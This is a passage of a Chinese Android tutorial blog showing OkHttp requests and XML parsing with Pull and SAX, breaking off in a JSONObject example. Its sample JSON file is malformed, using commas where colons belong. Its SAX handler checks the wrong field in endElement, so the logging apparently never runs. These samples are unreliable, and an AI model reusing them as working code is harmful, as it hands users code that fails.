class="string">"username=admin&amp;password=123456"</span>);</span><br></pre></td></tr></table></figure><h3 id="使用OkHttp"><a href="#使用OkHttp" class="headerlink" title="使用OkHttp"></a>使用OkHttp</h3><p>源码地址：<a href="http://github.com/square/okhttp" target="_blank" rel="noopener">http://github.com/square/okhttp</a></p><p>首先添加库依赖，在app/build.gradle的dependencies闭包中添加：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">implementation <span class="string">'com.squareup.okhttp3:okhttp:3.4.1'</span></span><br></pre></td></tr></table></figure><p>然后创建一个OkHttpClient实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br></pre></td></tr></table></figure><p>然后创建一个Request对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">    .url(<span class="string">"http://www.baidu.com"</span>)</span><br><span class="line">    .build();</span><br></pre></td></tr></table></figure><p>之后发起请求并获取返回数据：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Response response = client.newCall(request).execute();</span><br></pre></td></tr></table></figure><p>我们可以使用如下写法来获得返回的具体内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String responseData = response.body().string();</span><br></pre></td></tr></table></figure><p>发起POST请求写法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Request requestBody = <span class="keyword">new</span> FormBody.Builder()</span><br><span class="line">.add(<span class="string">"username"</span>, <span class="string">"admin"</span>)</span><br><span class="line">    .add(<span class="string">"password"</span>, <span class="string">"123456"</span>)</span><br><span class="line">    .build();</span><br><span class="line">Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">    .url(<span class="string">"http://www.baidu.com"</span>)</span><br><span class="line">    .post(requestBody)</span><br><span class="line">    .build();</span><br><span class="line">Response response = client.newCall(request).execute();</span><br><span class="line">String responseData = response.body().string();</span><br></pre></td></tr></table></figure><p>实践下，布局部分不用改，直接修改代码即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    TextView responseText;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button sendRequest = (Button) findViewById(R.id.send_request);</span><br><span class="line">        responseText = (TextView) findViewById(R.id.response_text);</span><br><span class="line">        sendRequest.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (v.getId() == R.id.send_request)&#123;</span><br><span class="line">                sendRequestWithOkHttp();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequestWithOkHttp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">                    Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">                            .url(<span class="string">"http://www.baidu.com"</span>)</span><br><span class="line">                            .build();</span><br><span class="line">                    Response response = client.newCall(request).execute();</span><br><span class="line">                    String responseData = response.body().string();</span><br><span class="line">                    showResponse(responseData);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">showResponse</span><span class="params">(<span class="keyword">final</span> String response)</span></span>&#123;</span><br><span class="line">        runOnUiThread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                responseText.setText(response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就完成了OkHttp的基本用法了。</p><h2 id="解析XML格式数据"><a href="#解析XML格式数据" class="headerlink" title="解析XML格式数据"></a>解析XML格式数据</h2><p>这里首先搭建一个web服务器用于提供数据。（这块就直接百度找吧，这里懒得搞）</p><p>在网站目录下添加一个get_data.xml文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">apps</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">app</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>1<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Google Maps<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">app</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">app</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>2<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Chrome<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">app</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">app</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>3<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Google Play<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">app</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">apps</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后就开始在android程序里获取和解析这段数据。</p><h3 id="Pull解析方式"><a href="#Pull解析方式" class="headerlink" title="Pull解析方式"></a>Pull解析方式</h3><p>这里继续之前的项目代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    TextView responseText;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button sendRequest = (Button) findViewById(R.id.send_request);</span><br><span class="line">        responseText = (TextView) findViewById(R.id.response_text);</span><br><span class="line">        sendRequest.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (v.getId() == R.id.send_request)&#123;</span><br><span class="line">                sendRequestWithOkHttp();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequestWithOkHttp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">                    Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">                            .url(<span class="string">"http://localhost/get_data.xml"</span>)</span><br><span class="line">                            .build();</span><br><span class="line">                    Response response = client.newCall(request).execute();</span><br><span class="line">                    String responseData = response.body().string();</span><br><span class="line">                    parseXMLWithPull(responseData);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">parseXMLWithPull</span><span class="params">(String xmlData)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            XmlPullParserFactory factory = XmlPullParserFactory.newInstance();</span><br><span class="line">            XmlPullParser xmlPullParser = factory.newPullParser();</span><br><span class="line">            xmlPullParser.setInput(<span class="keyword">new</span> StringReader(xmlData));</span><br><span class="line">            <span class="keyword">int</span> eventType = xmlPullParser.getEventType();</span><br><span class="line">            String id = <span class="string">""</span>;</span><br><span class="line">            String name = <span class="string">""</span>;</span><br><span class="line">            String version = <span class="string">""</span>;</span><br><span class="line">            <span class="keyword">while</span> (eventType != XmlPullParser.END_DOCUMENT) &#123;</span><br><span class="line">                String nodeName = xmlPullParser.getName();</span><br><span class="line">                <span class="keyword">switch</span> (eventType) &#123;</span><br><span class="line">                    <span class="keyword">case</span> XmlPullParser.START_TAG: &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="string">"id"</span>.equals(nodeName)) &#123;</span><br><span class="line">                            id = xmlPullParser.nextText();</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">"name"</span>.equals(nodeName)) &#123;</span><br><span class="line">                            name = xmlPullParser.nextText();</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">"version"</span>.equals(nodeName)) &#123;</span><br><span class="line">                            version = xmlPullParser.nextText();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> XmlPullParser.END_TAG: &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="string">"app"</span>.equals(nodeName)) &#123;</span><br><span class="line">                            Log.d(<span class="string">"MainActivity"</span>, <span class="string">"id is "</span> + id);</span><br><span class="line">                            Log.d(<span class="string">"MainActivity"</span>, <span class="string">"name is "</span> + name);</span><br><span class="line">                            Log.d(<span class="string">"MainActivity"</span>, <span class="string">"version is "</span> + version);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                eventType = xmlPullParser.next();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="SAX解析方式"><a href="#SAX解析方式" class="headerlink" title="SAX解析方式"></a>SAX解析方式</h3><p>首先新建一个MyHandler类继承自DefaultHandler，修改为如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyHandler</span> <span class="keyword">extends</span> <span class="title">DefaultHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String nodeName;</span><br><span class="line">    <span class="keyword">private</span> StringBuilder id;</span><br><span class="line">    <span class="keyword">private</span> StringBuilder name;</span><br><span class="line">    <span class="keyword">private</span> StringBuilder version;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startDocument</span><span class="params">()</span> <span class="keyword">throws</span> SAXException</span>&#123;</span><br><span class="line">        id = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        name = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        version = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException</span>&#123;</span><br><span class="line">        nodeName = localName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">characters</span><span class="params">(<span class="keyword">char</span>[] ch, <span class="keyword">int</span> start, <span class="keyword">int</span> length)</span> <span class="keyword">throws</span> SAXException</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"id"</span>.equals(nodeName))&#123;</span><br><span class="line">            id.append(ch, start, length);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">"name"</span>.equals(nodeName))&#123;</span><br><span class="line">            name.append(ch, start, length);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">"version"</span>.equals(nodeName))&#123;</span><br><span class="line">            version.append(ch, start, length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">endElement</span><span class="params">(String uri, String localName, String qName)</span> <span class="keyword">throws</span> SAXException</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"app"</span>.equals(nodeName)) &#123;</span><br><span class="line">            Log.d(<span class="string">"MainActivity"</span>, <span class="string">"id is "</span> + id.toString().trim());</span><br><span class="line">            Log.d(<span class="string">"MainActivity"</span>, <span class="string">"name is "</span> + name.toString().trim());</span><br><span class="line">            Log.d(<span class="string">"MainActivity"</span>, <span class="string">"version is "</span> + version.toString().trim());</span><br><span class="line">        &#125;</span><br><span class="line">        id.setLength(<span class="number">0</span>);</span><br><span class="line">        name.setLength(<span class="number">0</span>);</span><br><span class="line">        version.setLength(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">endDocument</span><span class="params">()</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.endDocument();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中trim()方法用于清除换行符。然后修改活动代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    TextView responseText;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button sendRequest = (Button) findViewById(R.id.send_request);</span><br><span class="line">        responseText = (TextView) findViewById(R.id.response_text);</span><br><span class="line">        sendRequest.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (v.getId() == R.id.send_request)&#123;</span><br><span class="line">                sendRequestWithOkHttp();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequestWithOkHttp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">                    Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">                            .url(<span class="string">"http://localhost/get_data.xml"</span>)</span><br><span class="line">                            .build();</span><br><span class="line">                    Response response = client.newCall(request).execute();</span><br><span class="line">                    String responseData = response.body().string();</span><br><span class="line">                    parseXMLWithSAX(responseData);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">parseXMLWithSAX</span><span class="params">(String xmlData)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            SAXParserFactory factory = SAXParserFactory.newInstance();</span><br><span class="line">            XMLReader xmlReader = factory.newSAXParser().getXMLReader();</span><br><span class="line">            MyHandler handler = <span class="keyword">new</span> MyHandler();</span><br><span class="line">            xmlReader.setContentHandler(handler);</span><br><span class="line">            xmlReader.parse(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(xmlData)));</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解析JSON个数数据"><a href="#解析JSON个数数据" class="headerlink" title="解析JSON个数数据"></a>解析JSON个数数据</h2><p>首先在网站目录下添加get_data.json文件：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[&#123;"id":"5","version":"5.5","name","Clash of Clans"&#125;,</span><br><span class="line">&#123;"id":"6","version":"7.0","name","Boom Beach"&#125;,</span><br><span class="line">&#123;"id":"7","version":"3.5","name","Clash Royale"&#125;]</span><br></pre></td></tr></table></figure><h3 id="使用JSONObject"><a href="#使用JSONObject" class="headerlink" title="使用JSONObject"></a>使用JSONObject</h3><p>修改代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    TextView responseText;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button sendRequest = (Button) findViewById(R.id.send_request);</span><br><span class="line">        responseText = (TextView) findViewById(R.id.response_text);</span><br><span class="line">        sendRequest.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (v.getId() == R.id.send_request)&#123;</span><br><span class="line">                sendRequestWithOkHttp();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequestWithOkHttp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">                    Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">                            .url(<span class="string">"http://localhost/get_data.json"</span>)</span><br><span class="line">                            .build();</span><br><span class="line">                    Response response = client.newCall(request).execute();</span><br><span class="line">                    String responseData = response.body().string();</span><br><span class="line">                    parseJSONWithJSONObject(responseData);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">    